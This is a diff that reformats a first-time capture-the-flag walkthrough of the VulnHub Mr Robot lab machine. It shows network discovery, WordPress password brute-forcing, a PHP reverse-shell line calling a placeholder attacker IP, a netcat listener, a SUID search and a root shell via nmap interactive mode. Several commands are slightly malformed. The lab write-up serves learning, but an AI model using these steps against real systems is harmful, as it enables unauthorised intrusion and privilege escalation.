@@ -1,16 +1,76 @@
-So Its 01/01/2026 marking this new year I have also taken my first step towards CTF via vulnhub with Mr Robot machine
+🛠️ First CTF Walkthrough – Mr Robot (VulnHub)
 
-1) Discovery using netdiscover -r 0x.0x.0x.0x/0x
-2) Port scanning using nmap -sS 10.15.1.111
-we found there is a web server open, So we'll try to put on web browser
-3) Directory bruteforce
-Here we can see /robots.txt and /wp-login and also a wordlist
-4) with the found wordlist bruteforce the password
-5) After entering to the wordpress re-configure the code to open a shell to attacker machines ip address in 443 port
-  <?php>
-    exec('/bin/bash -c "bash -i /dev/tcp/0x.0x.0x.0x/443 0>&1"');
-  <?>
+So Its 01/01/2026, marking this new year I have also taken my first step towards CTF via VulnHub with the Mr Robot machine.
 
-6) In attacker machine listen on the port nc -lvp 443
-Reverse shell has been established
-7) 
+🔍 Enumeration
+1️⃣ Discovery
+netdiscover -r 0x.0x.0x.0x/0x
+
+2️⃣ Port Scanning
+nmap -sS 10.15.1.111
+
+
+We found there is a web server open, so we'll try to put it on a web browser.
+
+🌐 Web Enumeration
+3️⃣ Directory Bruteforce
+
+Here we can see:
+
+/robots.txt
+
+/wp-login
+
+also a wordlist
+
+4️⃣ WordPress Bruteforce
+
+With the found wordlist, bruteforce the password.
+
+🐚 Gaining Reverse Shell
+5️⃣ Modify WordPress Code
+
+After entering to the WordPress, re-configure the code to open a shell to attacker machine IP address on 443 port.
+
+<?php>
+  exec('/bin/bash -c "bash -i /dev/tcp/0x.0x.0x.0x/443 0>&1"');
+?>
+
+6️⃣ Listener on Attacker Machine
+nc -lvp 443
+
+
+Reverse shell has been established.
+
+👤 Privilege Escalation
+7️⃣ User Enumeration
+
+With it we will finding the users and with CrackStation will be getting the passwd for the user.
+
+8️⃣ Spawn Proper Shell (PTY)
+
+Next is to become root, for that we will spawn a shell with pty.
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+This opens a shell.
+
+9️⃣ Find SUID Binaries
+
+Post that we will check who has root access or SUID.
+
+find / -perm /4000 -type f 2>&/tmp/2
+
+🔓 Root Access
+🔟 Misconfigured Nmap
+
+We found nmap has this misconfiguration.
+
+1️⃣1️⃣ Exploit Nmap Interactive Mode
+nmap --i
+!sh
+
+💥 Rooted
+
+bam!! done 🎉
